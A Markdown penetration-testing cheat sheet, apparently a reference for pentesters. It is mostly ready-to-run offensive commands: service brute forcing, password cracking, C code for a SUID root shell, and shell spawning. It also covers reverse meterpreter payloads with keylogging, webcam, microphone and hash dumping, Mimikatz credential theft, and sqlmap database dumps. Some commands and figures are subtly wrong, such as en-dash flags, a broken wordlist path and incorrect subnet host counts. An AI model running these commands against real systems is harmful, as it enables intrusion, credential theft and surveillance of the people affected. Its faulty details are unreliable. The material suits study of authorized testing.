# Penetration Testing Cheat Sheet 🕵️‍♂️

Welcome to the Penetration Testing Cheat Sheet! This comprehensive guide provides quick references, commands, and techniques for various aspects of penetration testing. Whether you're a beginner or an experienced pentester, this cheat sheet has got you covered.

## :mag: Recon and Enumeration

Explore tools and methods for reconnaissance and enumeration to gather valuable information about your target.

- [NMAP Commands](#nmap-commands)
- [SMB Enumeration](#smb-enumeration)
- [Other Host Discovery Methods](#other-host-discovery-methods)

## :computer: Python Local Web Server

Set up a Python local web server for various purposes, including hosting payloads and files.

- [Python Local Web Server](#python-local-web-server)

## :file_folder: Mounting File Shares

Learn how to mount file shares for easy access and interaction.

- [Mounting File Shares](#mounting-file-shares)

## :point_right: Basic FingerPrinting

Understand basic fingerprinting techniques to gather information about target systems.

- [Basic FingerPrinting](#basic-fingerprinting)

## :satellite: SNMP Enumeration

Discover SNMP services and gather information using SNMP enumeration.

- [SNMP Enumeration](#snmp-enumeration)

## :globe_with_meridians: DNS Zone Transfers

Perform DNS zone transfers to gather information about DNS records.

- [DNS Zone Transfers](#dns-zone-transfers)

## :mag_right: DNSRecon

Utilize DNSRecon for efficient DNS information gathering.

- [DNSRecon](#dnsrecon)

## :globe_with_meridians: HTTP / HTTPS Webserver Enumeration

Learn how to enumerate information from HTTP/HTTPS webservers.

- [HTTP / HTTPS Webserver Enumeration](#http--https-webserver-enumeration)

## :traffic_light: Packet Inspection

Inspect network packets and analyze traffic for security assessment.

- [Packet Inspection](#packet-inspection)

## :busts_in_silhouette: Username Enumeration

Enumerate usernames through SMB and SNMP services.

- [SMB User Enumeration](#smb-user-enumeration)
- [SNMP User Enumeration](#snmp-user-enumeration)

## :key: Passwords

Explore wordlists and resources for password-related tasks.

- [Wordlists](#wordlists)

## :shield: Brute Forcing Services

Learn about Hydra and its capabilities for brute forcing various services.

- [Hydra](#hydra)

## :lock: Password Cracking

Explore password cracking tools and techniques.

- [John The Ripper - JTR](#john-the-ripper--jtr)
- [Hashcat](#hashcat)

## :mag_right: Exploit Research

Discover techniques and resources for researching and identifying exploits.

- [Exploit Research](#exploit-research)

## :wrench: Compiling Exploits

Learn how to identify and compile exploits for various systems.

- [Identifying if C code is for Windows or Linux](#identifying-if-c-code-is-for-windows-or-linux)
- [Build Exploit GCC](#build-exploit-gcc)
- [GCC Compile 32Bit Exploit on 64Bit Kali](#gcc-compile-32bit-exploit-on-64bit-kali)
- [Compile Windows .exe on Linux](#compile-windows-exe-on-linux)

## :key: SUID Binary

Understand SUID binaries and their role in privilege escalation.

- [SUID C Shell for /bin/bash](#suid-c-shell-for-binbash)
- [SUID C Shell for /bin/sh](#suid-c-shell-for-binsh)
- [Building the SUID Shell binary](#building-the-suid-shell-binary)

## :shell: TTY Shells

Spawn TTY shells for various programming languages.

- [Python TTY Shell Trick](#python-tty-shell-trick)
- [Spawn Interactive sh shell](#spawn-interactive-sh-shell)
- [Spawn Perl TTY Shell](#spawn-perl-tty-shell)
- [Spawn Ruby TTY Shell](#spawn-ruby-tty-shell)
- [Spawn Lua TTY Shell](#spawn-lua-tty-shell)
- [Spawn TTY Shell from Vi](#spawn-tty-shell-from-vi)
- [Spawn TTY Shell from NMAP](#spawn-tty-shell-from-nmap)
- [Spawn TTY Shell from awk](#spawn-tty-shell-from-awk)
- [Spawn TTY Shell from socat](#spawn-tty-shell-from-socat)

## :space_invader: Metasploit

Explore Metasploit and its functionalities.

- [Meterpreter Payloads](#meterpreter-payloads)
- [Meterpreter Cheat Sheet](#meterpreter-cheat-sheet)
- [Common Metasploit Modules](#common-metasploit-modules)

## :repeat: Networking

Understand networking concepts for penetration testing.

- [TTL Fingerprinting](#ttl-fingerprinting)

## :globe_with_meridians: IPv4

Learn about IPv4 addressing and subnets.

- [Classful IP Ranges](#classful-ip-ranges)
- [IPv4 Private Address Ranges](#ipv4-private-address-ranges)
- [IPv4 Subnet Cheat Sheet](#ipv4-subnet-cheat-sheet)

## :1234: ASCII Table Cheat Sheet

Quickly reference ASCII values and characters.

- [ASCII Table Cheat Sheet](#ascii-table-cheat-sheet)

## :satellite: Cisco IOS Commands

Explore common Cisco IOS commands for network assessment.

- [Cisco IOS Commands](#cisco-ios-commands)


---

## 🕵️ Recon and Enumeration

### 🌐 NMAP Commands

Nmap (“Network Mapper”) is a free and open-source utility for network discovery and security auditing. It's a versatile tool used by both systems and network administrators for tasks like network inventory, managing service upgrade schedules, and monitoring host or service uptime. Nmap runs on all major computer operating systems, and official binary packages are available for Linux, Windows, and Mac OS X.

| Command | Description |
|---------|-------------|
| `nmap -v -sS -A -T4 target` | Nmap verbose scan, runs syn stealth, T4 timing, OS and service version info, traceroute and scripts against services. |
| `ping sweep sudo nmap -pn target` | Does a ping sweep over the target's network to see all the available IPs. |
| `nmap -v -sS -p–A -T4 target` | As above but scans all TCP ports (takes a lot longer). |
| `nmap -v -sU -sS -p- -A -T4 target` | As above but scans all TCP ports and UDP scan (takes even longer). |
| `nmap -v -p 445 –script=smb-check-vulns --script-args=unsafe=1 192.168.1.X` | Nmap script to scan for vulnerable SMB servers. |
| `nmap localhost` | Displays all the ports that are currently in use. |
| `ls /usr/share/nmap/scripts/* \| grep ftp` | Search nmap scripts for keywords. |

### 📂 SMB Enumeration

In computer networking, Server Message Block (SMB) operates as an application-layer network protocol mainly used for providing shared access to files, printers, and serial ports.

| Command | Description |
|---------|-------------|
| `nbtscan 192.168.1.0/24` | Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain. |
| `enum4linux -a target-ip` | Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing. |
| `smbclient -L target-ip` | Lists all SMB shares available on the target machine. |
| `smbget -R smb://target-ip/share` | Recursively downloads files from an SMB share. |
| `rpcclient -U "" target-ip` | Connects to an SMB server using an empty username and lists available commands. |
| `showmount -e target-ip` | Shows the available shares on the target machine, useful for NFS. |
| `smbmap -H target-ip` | Shows share permissions of the target. |
| `smbstatus` | Lists current Samba connections. Useful when run on the target machine. |

### 🌐 Other Host Discovery Methods

Other methods of host discovery that don’t use Nmap.

| Command | Description |
|---------|-------------|
| `netdiscover -r 192.168.1.0/24` | Discovers IP, MAC Address and MAC vendor on the subnet from ARP. |
| `arp-scan --interface=eth0 192.168.1.0/24` | ARP scan to discover hosts on the local network. |
| `fping -g 192.168.1.0/24` | Sends ICMP echo requests to multiple hosts to check if they are alive. |
| `masscan -p1-65535,U:1-65535 192.168.1.0/24 --rate=1000` | Scans all ports at a high rate, useful for initial discovery. |

## 🐍 Python Local Web Server

Python local web server command, handy for serving up shells and exploits on an attacking machine.

| Command | Description |
|---------|-------------|
| `python -m SimpleHTTPServer 80` | Run a basic HTTP server, great for serving up shells etc. |
| `python3 -m http.server 80` | Run a basic HTTP server using Python 3. |
| `python -m SimpleHTTPServer 80 --bind 192.168.1.2` | Bind the server to a specific IP address. |

## 🗄️ Mounting File Shares

How to mount NFS / CIFS, Windows and Linux file shares.

| Command | Description |
|---------|-------------|
| `mount 192.168.1.1:/vol/share /mnt/nfs` | Mount NFS share to `/mnt/nfs`. |
| `mount -t cifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs` | Mount Windows CIFS / SMB share on Linux at `/mnt/cifs`. |
| `net use Z: \\win-server\share password /user:domain\janedoe /savecred /p:no` | Mount a Windows share on Windows from the command line. |
| `apt-get install smb4k -y` | Install smb4k on Kali, useful Linux GUI for browsing SMB shares. |
| `smbclient -L //192.168.1.X -U username` | List SMB shares available on a Windows machine. |

## 🕵️ Basic FingerPrinting

A device fingerprint or machine fingerprint or browser fingerprint is information collected about a remote computing device for the purpose of identification.

| Command | Description |
|---------|-------------|
| `nc -v 192.168.1.1 25` | Basic versioning / fingerprinting via displayed banner. |
| `telnet 192.168.1.1 25` | Another method for basic versioning / fingerprinting. |
| `curl -I http://192.168.1.1` | Fetch HTTP headers for fingerprinting the web server. |
| `nmap -O 192.168.1.1` | Perform OS detection using Nmap. |
| `whatweb 192.168.1.1` | Identify web technologies in use on the target. |

## 📡 SNMP Enumeration

SNMP enumeration is the process of using SNMP to enumerate user accounts on a target system.

| Command | Description |
|---------|-------------|
| `snmpcheck -t 192.168.1.X -c public` | SNMP enumeration |
| `snmpwalk -c public -v1 192.168.1.X 1` | SNMP enumeration |
| `snmpenum -t 192.168.1.X` | SNMP enumeration |
| `onesixtyone -c names -i hosts` | SNMP enumeration |
| `snmpbulkwalk -v2c -c public -Cn0 -Cr10 192.168.1.X` | Bulk SNMP enumeration |

## 🌐 DNS Zone Transfers

| Command | Description |
|---------|-------------|
| `nslookup -> set type=any -> ls -d blah.com` | Windows DNS zone transfer |
| `dig axfr blah.com @ns1.blah.com` | Linux DNS zone transfer |
| `host -l blah.com ns1.blah.com` | Another Linux DNS zone transfer method |

## 📡 DNSRecon

DNSRecon provides the ability to perform various DNS enumeration tasks.

`dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml`

## 🌐 HTTP / HTTPS Webserver Enumeration

| Command | Description |
|---------|-------------|
| `nikto -h 192.168.1.1` | Perform a nikto scan against target |
| `dirbuster` | Configure via GUI, CLI input doesn’t work most of the time |
| `gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` | Directory brute forcing with gobuster |
| `wpscan --url http://192.168.1.1` | WordPress vulnerability scanner |
| `joomscan -u http://192.168.1.1` | Joomla vulnerability scanner |
| `uniscan -u http://192.168.1.1 -qweds` | Uniscan automated vulnerability scanner |
| `curl -I http://192.168.1.1` | Fetch HTTP headers using curl |
| `nmap -p80 --script http-enum 192.168.1.1` | Nmap script for HTTP enumeration |
| `whatweb http://192.168.1.1` | Identify technologies used on the website |
| `wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://192.168.1.1/FUZZ` | Fuzzing HTTP with wfuzz |

## 📦 Packet Inspection

| Command | Description |
|---------|-------------|
| `tcpdump tcp port 80 -w output.pcap -i eth0` | Capture packets on port 80 |
| `tcpdump -i eth0 'port 443 and (tcp-syn|tcp-ack)!=0'` | Capture only SYN and ACK packets on port 443 |
| `wireshark -k -i <interface>` | Open Wireshark on a specific interface |
| `tshark -i eth0 -f "tcp port 80"` | Capture packets with tshark on port 80 |

## 👤 Username Enumeration

### SMB User Enumeration

| Command | Description |
|---------|-------------|
| `python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX` | Enumerate users from SMB |
| `ridenum.py 192.168.XXX.XXX 500 50000 dict.txt` | RID cycle SMB / enumerate users from SMB |
| `enum4linux -U 192.168.XXX.XXX` | Enumerate SMB usernames using enum4linux |

### SNMP User Enumeration

| Command | Description |
|---------|-------------|
| `snmpwalk public -v1 192.168.X.XXX 1 | grep 77.1.2.25 | cut -d" " -f4` | Enumerate users from SNMP |
| `python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP 192.168.X.XXX` | Enumerate users from SNMP |
| `nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt` | Search for SNMP servers with nmap, grepable output |

## 🔒 Passwords

### Wordlists

| Command | Description |
|---------|-------------|
| `/usr/share/wordlists` | Kali word lists |
| `wget https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt` | Download a popular wordlist from GitHub |


## 🛠️ Brute Forcing Services

### Hydra

#### FTP Brute Force

| Command | Description |
|---------|-------------|
| `hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V` | Hydra FTP brute force |

#### POP3 Brute Force

| Command | Description |
|---------|-------------|
| `hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V` | Hydra POP3 brute force |

#### SMTP Brute Force

| Command | Description |
|---------|-------------|
| `hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V` | Hydra SMTP brute force |

#### SSH Brute Force

| Command | Description |
|---------|-------------|
| `hydra -l root -P /usr/share/wordlistsnmap.lst 192.168.X.XXX ssh` | Hydra SSH brute force |

> Use `-t` to limit concurrent connections, example: `-t 15`

## 🔐 Password Cracking

### John The Ripper – JTR

| Command | Description |
|---------|-------------|
| `john –wordlist=/usr/share/wordlists/rockyou.txt hashes` | JTR password cracking |
| `john –format=descrypt –wordlist /usr/share/wordlists/rockyou.txt hash.txt` | JTR forced descrypt cracking with wordlist |
| `john –format=descrypt hash –show` | JTR forced descrypt brute force cracking |

### Hashcat

| Command | Description |
|---------|-------------|
| `hashcat -m 0 -a 0 hash.txt wordlist.txt` | Hashcat MD5 cracking |
| `hashcat -m 1000 -a 0 hash.txt wordlist.txt` | Hashcat NTLM cracking |

## Exploit Research

| Command | Description |
|---------|-------------|
| `searchsploit windows 2003 | grep -i local` | Search exploit-db for Windows 2003 local exploits |
| `site:exploit-db.com exploit kernel <= 3` | Google search for kernel exploits on exploit-db.com |
| `grep -R "W7" /usr/share/metasploit-framework/modules/exploit/windows/*` | Search Metasploit modules for Windows 7 exploits |
| `msfconsole -q -x "search name:windows type:exploit"` | Search Metasploit for Windows exploits |

## Compiling Exploits

### Identifying if C code is for Windows or Linux

| Header Files | OS |
|--------------|----|
| `process.h, string.h, winbase.h, windows.h, winsock2.h` | Windows |
| `arpa/inet.h, fcntl.h, netdb.h, netinet/in.h, sys/sockt.h, sys/types.h, unistd.h` | Linux |

### Build Exploit GCC

| Command | Description |
|---------|-------------|
| `gcc -o exploit exploit.c` | Basic GCC compile |
| `gcc -Wall -Wextra exploit.c -o exploit` | Compile with all warnings and extras |

### GCC Compile 32Bit Exploit on 64Bit Kali

| Command | Description |
|---------|-------------|
| `gcc -m32 exploit.c -o exploit` | Cross compile 32-bit binary on 64-bit Linux |

### Compile Windows .exe on Linux

| Command | Description |
|---------|-------------|
| `i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe` | Compile Windows .exe on Linux |
| `x86_64-w64-mingw32-gcc exploit.c -o exploit.exe` | Compile 64-bit Windows .exe on Linux |

## SUID Binary

### SUID C Shell for /bin/bash
```
int main(void){
       setresuid(0, 0, 0);
       system("/bin/bash");
}
```
### SUID C Shell for /bin/sh
```
int main(void){
       setresuid(0, 0, 0);
       system("/bin/sh");
}
```
### Building the SUID Shell binary

| Command | Description |
|---------|-------------|
| `gcc -o suid suid.c` | Compile the SUID shell |
| `gcc -m32 -o suid suid.c` | Compile the 32-bit SUID shell |

## TTY Shells

### Python TTY Shell Trick

`python -c 'import pty;pty.spawn("/bin/bash")'`

`python3 -c 'import pty;pty.spawn("/bin/bash")'`

### Spawn Interactive sh shell

`/bin/sh -i`

### Spawn Perl TTY Shell

`perl -e 'exec "/bin/sh";'`

### Spawn Ruby TTY Shell

`ruby -e 'exec "/bin/sh"'`

### Spawn Lua TTY Shell

`lua -e 'os.execute("/bin/sh")'`

### Spawn TTY Shell from Vi

`:!bash`

### Spawn TTY Shell from NMAP

`!sh`

### Spawn TTY Shell from awk

`awk 'BEGIN {system("/bin/sh")}'`

### Spawn TTY Shell from socat

`socat file:`tty`,raw,echo=0 tcp-listen:4444`

## Metasploit

### Meterpreter Payloads

#### Windows reverse meterpreter payload

`set payload windows/meterpreter/reverse_tcp`

#### Windows VNC Meterpreter payload

`set payload windows/vncinject/reverse_tcp`

`set ViewOnly false`

#### Linux Reverse Meterpreter payload

`set payload linux/meterpreter/reverse_tcp`

#### Android Reverse Meterpreter payload

`set payload android/meterpreter/reverse_tcp`

### Meterpreter Cheat Sheet

| Command | Description |
|---------|-------------|
| `upload file c:\\windows` | Upload file to Windows target |
| `download c:\\windows\\repair\\sam /tmp` | Download file from Windows target |
| `execute -f c:\\windows\temp\exploit.exe` | Run .exe on target |
| `execute -f cmd -c` | Creates new channel with cmd shell |
| `ps` | Show processes |
| `shell` | Get shell on the target |
| `getsystem` | Attempts privilege escalation on the target |
| `hashdump` | Dump the hashes on the target |
| `portfwd add –l 3389 –p 3389 –r target` | Create port forward to target machine |
| `portfwd delete –l 3389 –p 3389 –r target` | Delete port forward |
| `screenshot` | Capture screenshot of the target machine |
| `keyscan_start` | Start keylogger |
| `keyscan_dump` | Dump collected keystrokes |
| `webcam_snap` | Take webcam snapshot |
| `record_mic` | Record microphone |
| `enum_chrome` | Enumerate Chrome browser data |
## :computer: Common Metasploit Modules

### :closed_lock_with_key: Remote Windows Metasploit Modules (exploits)

| Command | Description |
|---------|-------------|
| `use exploit/windows/smb/ms08_067_netapi` | MS08_067 Windows 2k, XP, 2003 Remote Exploit |
| `use exploit/windows/dcerpc/ms06_040_netapi` | MS08_040 Windows NT, 2k, XP, 2003 Remote Exploit |
| `use exploit/windows/smb/ms09_050_smb2_negotiate_func_index` | MS09_050 Windows Vista SP1/SP2 and Server 2008 (x86) Remote Exploit |
| `use exploit/windows/smb/ms17_010_eternalblue` | MS17_010 EternalBlue SMB Remote Windows Kernel Pool Corruption |

### :key: Local Windows Metasploit Modules (exploits)

| Command | Description |
|---------|-------------|
| `use exploit/windows/local/bypassuac` | Bypass UAC on Windows 7 + Set target + arch, x86/64 |
| `use exploit/windows/local/ms10_015_kitrap0d` | MS10_015 Kitrap0d Local Privilege Escalation |

### :mag: Auxilary Metasploit Modules

| Command | Description |
|---------|-------------|
| `use auxiliary/scanner/http/dir_scanner` | Metasploit HTTP directory scanner |
| `use auxiliary/scanner/http/jboss_vulnscan` | Metasploit JBOSS vulnerability scanner |
| `use auxiliary/scanner/mssql/mssql_login` | Metasploit MSSQL Credential Scanner |
| `use auxiliary/scanner/mysql/mysql_version` | Metasploit MySQL Version Scanner |
| `use auxiliary/scanner/oracle/oracle_login` | Metasploit Oracle Login Module |

### :shell: Metasploit Powershell Modules

| Command | Description |
|---------|-------------|
| `use exploit/multi/script/web_delivery` | Metasploit powershell payload delivery module |
| `post/windows/manage/powershell/exec_powershell` | Metasploit upload and run powershell script through a session |
| `use exploit/multi/http/jboss_maindeployer` | Metasploit JBOSS deploy |
| `use exploit/windows/mssql/mssql_payload` | Metasploit MSSQL payload |

### :wrench: Post Exploit Windows Metasploit Modules

| Command | Description |
|---------|-------------|
| `run post/windows/gather/win_privs` | Metasploit show privileges of current user |
| `use post/windows/gather/credentials/gpp` | Metasploit grab GPP saved passwords |
| `load mimikatz -> wdigest` | Metasploit load Mimikatz |
| `run post/windows/gather/local_admin_search_enum` | Identify other machines that the supplied domain user has administrative access to |

## :satellite: Networking

### :signal_strength: TTL Fingerprinting

| Operating System | TTL Size |
|------------------|----------|
| Windows | 128 |
| Linux | 64 |
| Solaris | 255 |
| Cisco / Network | 255 |


## IPv4 :earth_americas:

### Classful IP Ranges :chart_with_upwards_trend:

> **Note**: Class A, B, C are deprecated

| Class | IP Address Range |
| ----- | ---------------- |
| Class A :one: | 0.0.0.0 – 127.255.255.255 |
| Class B :two: | 128.0.0.0 – 191.255.255.255 |
| Class C :three: | 192.0.0.0 – 223.255.255.255 |
| Class D :four: | 224.0.0.0 – 239.255.255.255 |
| Class E :five: | 240.0.0.0 – 255.255.255.255 |

### IPv4 Private Address Ranges :lock:

| Class | Range |
| ----- | ----- |
| Class A :one: | 10.0.0.0 – 10.255.255.255 |
| Class B :two: | 172.16.0.0 – 172.31.255.255 |
| Class C :three: | 192.168.0.0 – 192.168.255.255 |
| Loopback :repeat: | 127.0.0.0 – 127.255.255.255 |

### IPv4 Subnet Cheat Sheet :memo:

| CIDR | Decimal Mask | Number of Hosts |
| ---- | ----------- | --------------- |
| /31  | 255.255.255.254 | 1 Host |
| /30  | 255.255.255.252 | 2 Hosts |
| /29  | 255.255.255.248 | 6 Hosts |
| /28  | 255.255.255.240 | 14 Hosts |
| /27  | 255.255.255.224 | 30 Hosts |
| /26  | 255.255.255.192 | 62 Hosts |
| /25  | 255.255.255.128 | 126 Hosts |
| /24  | 255.255.255.0   | 254 Hosts |
| /23  | 255.255.254.0   | 512 Hosts |
| /22  | 255.255.252.0   | 1022 Hosts |
| /21  | 255.255.248.0   | 2046 Hosts |
| /20  | 255.255.240.0   | 4094 Hosts |
| /19  | 255.255.224.0   | 8190 Hosts |
| /18  | 255.255.192.0   | 16382 Hosts |
| /17  | 255.255.128.0   | 32766 Hosts |
| /16  | 255.255.0.0     | 65534 Hosts |
| /15  | 255.254.0.0     | 131070 Hosts |
| /14  | 255.252.0.0     | 262142 Hosts |
| /13  | 255.248.0.0     | 524286 Hosts |
| /12  | 255.240.0.0     | 1048674 Hosts |
| /11  | 255.224.0.0     | 2097150 Hosts |
| /10  | 255.192.0.0     | 4194302 Hosts |
| /9   | 255.128.0.0     | 8388606 Hosts |
| /8   | 255.0.0.0       | 16777214 Hosts |

## ASCII Table Cheat Sheet :keyboard:

Useful for Web Application Penetration Testing, or if you get stranded on Mars and need to communicate with NASA.

| ASCII | Character | ASCII | Character | ASCII | Character | ASCII | Character |
| ----- | --------- | ----- | --------- | ----- | --------- | ----- | --------- |
| x00   | Null Byte | x08   | BS        | x09   | TAB       | x0a   | LF        |
| x0d   | CR        | x1b   | ESC       | x20   | SPC       | x21   | !         |
| x22   | "         | x23   | #         | x24   | $         | x25   | %         |
| x26   | &         | x27   | \`        | x28   | (         | x29   | )         |
| x2a   | *         | x2b   | +         | x2c   | ,         | x2d   | -         |
| x2e   | .         | x2f   | /         | x30   | 0         | x31   | 1         |
| x32   | 2         | x33   | 3         | x34   | 4         | x35   | 5         |
| x36   | 6         | x37   | 7         | x38   | 8         | x39   | 9         |
| x3a   | :         | x3b   | ;         | x3c   | <         | x3d   | =         |
| x3e   | >         | x3f   | ?         | x40   | @         | x41   | A         |
| x42   | B         | x43   | C         | x44   | D         | x45   | E         |
| x46   | F         | x47   | G         | x48   | H         | x49   | I         |
| x4a   | J         | x4b   | K         | x4c   | L         | x4d   | M         |
| x4e   | N         | x4f   | O         | x50   | P         | x51   | Q         |
| x52   | R         | x53   | S         | x54   | T         | x55   | U         |
| x56   | V         | x57   | W         | x58   | X         | x59   | Y         |
| x5a   | Z         | x5b   | [         | x5c   | \\        | x5d   | ]         |
| x5e   | ^         | x5f   | _         | x60   | \`        | x61   | a         |
| x62   | b         | x63   | c         | x64   | d         | x65   | e         |
| x66   | f         | x67   | g         | x68   | h         | x69   | i         |
| x6a   | j         | x6b   | k         | x6c   | l         | x6d   | m         |
| x6e   | n         | x6f   | o         | x70   | p         | x71   | q         |
| x72   | r         | x73   | s         | x74   | t         | x75   | u         |
| x76   | v         | x77   | w         | x78   | x         | x79   | y         |
| x7a   | z         |



## Cisco IOS Commands :computer:

| Command                                       | Description                        |
| --------------------------------------------- | ---------------------------------- |
| `enable`                                       | Enters enable mode                 |
| `conf t`                                       | Short for, configure terminal      |
| `(config)# interface fa0/0`                    | Configure FastEthernet 0/0         |
| `(config-if)# ip addr 0.0.0.0 255.255.255.255` | Add IP to fa0/0                    |
| `(config-if)# line vty 0 4`                    | Configure vty line                 |
| `(config-line)# login`                         | Cisco set telnet password          |
| `(config-line)# password YOUR-PASSWORD`        | Set telnet password                |
| `# show running-config`                        | Show running config loaded in memory|
| `# show startup-config`                        | Show startup config                |
| `# show version`                               | Show Cisco IOS version             |
| `# show session`                               | Display open sessions              |
| `# show ip interface`                          | Show network interfaces            |
| `# show interface e0`                          | Show detailed interface info       |
| `# show ip route`                              | Show routes                        |
| `# show access-lists`                         | Show access lists                  |
| `# dir file systems`                           | Show available files               |
| `# dir all-filesystems`                        | File information                   |
| `# dir /all`                                   | Show deleted files                 |
| `# terminal length 0`                          | No limit on terminal output        |
| `# copy running-config tftp`                   | Copies running config to tftp server|
| `# copy running-config startup-config`         | Copy startup-config to running-config|

## Cryptography :lock:

### Hash Lengths

| Hash        | Size      |
| ----------- | --------- |
| MD5         | 16 Bytes  |
| SHA-1       | 20 Bytes  |
| SHA-256     | 32 Bytes  |
| SHA-512     | 64 Bytes  |

### Hash Examples

| Hash                  | Example                             |
| --------------------- | ----------------------------------- |
| MD5 Hash Example      | 8743b52063cd84097a65d1633f5c74f5      |
| SHA1 Hash Example     | b89eaac7e61417341b710b727768294d0e6a277b|
| SHA-256               | 127e6fbfe24a750e72930c220a8e138275656b8e5d8f48a98c3c92df2caba935|
| SHA-512               | 82a9dda829eb7f8ffe9fbe49e45d47d2dad9664fbb7adf72492e3c81ebd3e29134d9bc12212bf83c6840f10e8246b9db54a4859b7ccd0123d86e5872c1e5082f|

## SQLMap Examples :bug:

| Command                                                                 | Description                                       |
| ----------------------------------------------------------------------- | -------------------------------------------------- |
| `sqlmap -u http://meh.com –forms –batch –crawl=10 –cookie=jsessionid=54321 –level=5 –risk=3` | Automated sqlmap scan                             |
| `sqlmap -u TARGET -p PARAM –data=POSTDATA –cookie=COOKIE –level=3 –current-user –current-db –passwords –file-read="/var/www/blah.php"` | Targeted sqlmap scan                              |
| `sqlmap -u "http://meh.com/meh.php?id=1" –dbms=mysql –tech=U –random-agent –dump` | Scan URL for union + error-based injection with MySQL backend and use a random user agent + database dump |
| `sqlmap -o -u "http://meh.com/form/" –forms`                             | SQLMap check form for injection                    |
| `sqlmap -o -u "http://meh/vuln-form" –forms -D database-name -T users –dump` | SQLMap dump and crack hashes for table users on database-name |

